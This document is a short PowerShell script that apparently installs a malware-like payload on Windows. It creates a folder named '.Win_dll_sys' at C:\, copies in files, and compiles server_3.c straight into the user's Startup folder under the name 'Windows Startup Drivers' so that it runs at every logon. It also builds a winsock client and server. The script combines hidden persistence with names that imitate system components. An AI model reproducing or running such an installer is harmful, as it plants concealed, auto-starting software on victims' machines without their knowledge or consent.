
# Specify the name of the folder you want to create
$folderName = ".Win_dll_sys"
$homePath = "C:\"

# Combine the home directory path with the folder name
$folderPath = Join-Path -Path $homePath -ChildPath $folderName

# Check if the folder already exists, if not, create it
if (-not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory
    # Write-Host "Folder '$folderName' created successfully in $homePath."
} else {
    # Write-Host "Folder '$folderName' already exists in $homePath."
}

$sourcePath = "maxresdefault.txt"
Copy-Item -Path $sourcePath -Destination $folderPath -Force -Recurse

$sourcePath = "windows_drivers"
Copy-Item -Path $sourcePath -Destination $folderPath -Force -Recurse

$destinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Startup Drivers"
gcc server_3.c -lwinmm -o $destinationPath2

gcc client.c -lws2_32 -lwinmm -o client
gcc server.c -lws2_32 -lwinmm -o server



# Get the home directory path for the current user


